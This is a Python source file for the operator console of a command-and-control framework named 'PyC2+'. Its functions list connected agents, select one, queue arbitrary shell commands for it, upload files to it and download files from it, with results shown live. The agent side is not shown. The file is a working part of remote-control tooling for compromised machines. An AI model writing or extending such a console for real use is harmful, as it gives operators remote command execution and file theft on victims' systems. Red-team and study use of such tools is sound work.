import time
import os
import json
import base64
import threading

from lib.config import agents, tasks, results, result_queues, AGENT_TIMEOUT

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def start_cli():
    time.sleep(1)

    print(CYAN + BOLD + "\n" + "="*50)
    print("                 PyC2+ CLI")
    print("="*50 + RESET)
    print(YELLOW + "Type 'help' for commands or 'exit' to quit.\n" + RESET)

    selected = None
    stop_live = threading.Event()

    # LIVE OUTPUT THREAD
    def live_thread():
        while not stop_live.is_set():
            if not selected:
                time.sleep(0.2)
                continue

            q = result_queues.get(selected)
            if not q:
                time.sleep(0.2)
                continue

            try:
                entry = q.get(timeout=0.2)
            except:
                continue

            print(f"\n{YELLOW}[{entry['timestamp']}] {RESET}")
            print(CYAN + entry["result"] + RESET)

    threading.Thread(target=live_thread, daemon=True).start()

    # USER PROMPT
    def prompt():
        if selected:
            return f"\n{RED}[PyC2+ | {selected}]{RESET}> "
        return f"\n{RED}[PyC2+]{RESET}> "

    # MAIN LOOP
    while True:
        try:
            cmd = input(prompt()).strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{YELLOW}Exiting PyC2+ CLI...{RESET}")
            stop_live.set()
            break

        if not cmd:
            continue

        # HELP MENU
        if cmd == "help":
            print(CYAN + BOLD + "\nAvailable commands:" + RESET)
            print(f"{GREEN}  agents{RESET}                   - list all agents")
            print(f"{GREEN}  select <id>{RESET}              - select an agent")
            print(f"{GREEN}  send <command>{RESET}           - send shell command to agent")
            print(f"{GREEN}  put <local> <remote>{RESET}     - upload file to agent")
            print(f"{GREEN}  get <remote_path>{RESET}        - download file from agent")
            print(f"{GREEN}  history{RESET}                  - show stored results for selected agent")
            print(f"{GREEN}  exit{RESET}                     - quit CLI\n")
            continue

        # LIST AGENTS
        if cmd == "agents":
            live = [
                aid for aid, info in agents.items()
                if time.time() - info["last_seen"] <= AGENT_TIMEOUT
            ]

            if not live:
                print(RED + "[!] No agents connected." + RESET)
            else:
                print(CYAN + "\nConnected agents:" + RESET)
                for a in live:
                    print(f"{YELLOW}  → {a}{RESET}")
            continue

        # SELECT AGENT
        if cmd.startswith("select "):
            aid = cmd.split()[1]
            if aid in agents and time.time() - agents[aid]["last_seen"] <= AGENT_TIMEOUT:
                selected = aid
                print(f"{GREEN}[+] Selected agent: {aid}{RESET}")

                # Clear existing queued live-output
                with result_queues[aid].mutex:
                    result_queues[aid].queue.clear()

            else:
                print(RED + "[!] Invalid or offline agent." + RESET)
            continue

        # PUT FILE
        if cmd.startswith("put "):
            if not selected:
                print(RED + "[!] Select an agent first." + RESET)
                continue

            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print(RED + "[!] Agent offline." + RESET)
                continue

            parts = cmd.split(" ")
            if len(parts) < 3:
                print(RED + "[!] Usage: put <local_path> <remote_filename>" + RESET)
                continue

            local = parts[1]
            remote = parts[2]

            if not os.path.isfile(local):
                print(RED + "[!] Local file not found." + RESET)
                continue

            with open(local, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()

            payload = json.dumps({"type": "put", "filename": remote, "data": b64})
            tasks[selected].put(payload)

            print(f"{GREEN}[+] Uploaded {local} → {remote} (queued for agent){RESET}")
            continue

        # GET FILE
        if cmd.startswith("get "):
            if not selected:
                print(RED + "[!] Select an agent first." + RESET)
                continue

            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print(RED + "[!] Agent offline." + RESET)
                continue

            remote_path = cmd[len("get "):].strip()

            payload = json.dumps({"type": "get", "path": remote_path})
            tasks[selected].put(payload)

            print(f"{GREEN}[+] Requested file: {remote_path}{RESET}")
            continue

        # SEND COMMAND
        if cmd.startswith("send "):
            if not selected:
                print(RED + "[!] Select agent first." + RESET)
                continue

            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
                print(RED + "[!] Agent offline." + RESET)
                continue

            command = cmd[5:]
            tasks[selected].put(command)
            print(f"{GREEN}[+] Command queued for agent: {command}{RESET}")
            continue

        # HISTORY
        if cmd == "history":
            if not selected:
                print(RED + "[!] No agent selected." + RESET)
                continue

            for e in results[selected]:
                print(f"\n{YELLOW}[{e['timestamp']}] {RESET}")
                print(CYAN + e["result"] + RESET)
            continue

        # EXIT
        if cmd == "exit":
            print(YELLOW + "Leaving CLI..." + RESET)
            stop_live.set()
            break

        # UNKNOWN COMMAND
        print(RED + "[!] Unknown command." + RESET)
